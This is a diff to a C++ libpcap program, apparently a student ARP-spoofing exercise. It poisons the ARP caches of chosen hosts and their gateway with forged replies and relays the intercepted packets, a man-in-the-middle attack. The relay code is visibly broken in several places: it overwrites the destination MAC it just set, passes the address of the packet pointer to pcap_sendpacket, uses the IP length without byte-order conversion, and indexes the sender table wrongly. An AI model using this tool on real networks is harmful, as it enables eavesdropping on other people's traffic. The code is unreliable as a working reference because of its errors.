@@ -1,7 +1,8 @@
-#include <cstdio>
+﻿#include <cstdio>
 #include <pcap.h>
 #include "ethhdr.h"
 #include "arphdr.h"
+#include "iphdr.h"
 #include "my_class.h"
 
 #pragma pack(push, 1)
@@ -89,6 +90,7 @@ int main(int argc, char* argv[]) {
         sender_group[i].target_ip = Ip(argv[i+3]);
     }
 
+    // get gateway mac address
     send_arp_packet(1, dev, what_mac, my_mac, my_mac, my_ip, tmac, tip);
     Mac gateway_mac = receive_arp_reply(dev, tip);
 
@@ -123,23 +125,71 @@ int main(int argc, char* argv[]) {
         }
 
         struct EthHdr* eth_hdr = (struct EthHdr*)(packet);
+        struct ArpHdr* arp_hdr = (struct ArpHdr*)(packet+14);
+        struct IpHdr* ip_hdr = (struct IpHdr*)(packet+14);
 
-        if (eth_hdr->type_ == 2054){        // If Packet is ARP Packet
-            struct ArpHdr* arp_hdr = (struct ArpHdr*)(packet+14);
-            for (int i = 0 ; i < (argc - 2) ; i ++) {
-                if (eth_hdr->smac_ == sender_group[i].sender_mac){   // if source_mac is in the sender_group
-                    send_arp_packet(2, dev, eth_hdr->smac_, my_mac, my_mac, sender_group[i].target_ip, eth_hdr->smac_, arp_hdr->sip_);
-                    break;
-                } else if (eth_hdr->smac_ == gateway_mac) {
-                    send_arp_packet(1, dev, gateway_mac, sender_group[i].sender_mac, my_mac, sender_group[i].sender_ip, gateway_mac, tip);
+        if (eth_hdr->smac_ == gateway_mac) {
+            if (eth_hdr->type_ == 2054 && arp_hdr->op_ == 1 && eth_hdr->dmac_ == what_mac) {
+                for (int i = 0 ; i < (argc - 2) ; i ++) {
+                    if(arp_hdr->tip_ == sender_group[i].sender_ip) {
+                        send_arp_packet(2, dev, gateway_mac, my_mac, my_mac, sender_group[i].sender_ip, gateway_mac, sender_group->target_ip);
+                        break;
+                    }
+                }
+            }else {
+                //relay
+                for (int i = 0 ; i < (argc - 2) ; i ++) {
+                    if(ip_hdr->dip == sender_group[i].sender_ip) {
+                        eth_hdr->dmac_ = sender_group[i].sender_mac;
+                        eth_hdr->dmac_ = my_mac;
+                        pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), ip_hdr->total_length+14);
+                    }
                 }
             }
+        }else {
+            if (eth_hdr->type_ == 2054 && arp_hdr->op_ == 1 && eth_hdr->dmac_ == what_mac) {
+                for (int i = 0 ; i < (argc - 2) ; i ++) {
+                    if (eth_hdr->smac_ == sender_group[i].sender_mac){   // if source_mac is in the sender_group
+                        send_arp_packet(2, dev, sender_group[i].sender_mac, my_mac, my_mac, sender_group[i].target_ip, sender_group[i].sender_mac, sender_group[i].sender_ip);
+                        break;
+                    }
+                }
+            } else {
+                //relay
+                eth_hdr->dmac_ = gateway_mac;
+                eth_hdr->smac_ = my_mac;
+                pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), ip_hdr->total_length+14);
 
-        } else {                            // Not ARP Packet ( = To Relay)
-
+            }
         }
-
     }
 
     pcap_close(handle);
 }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
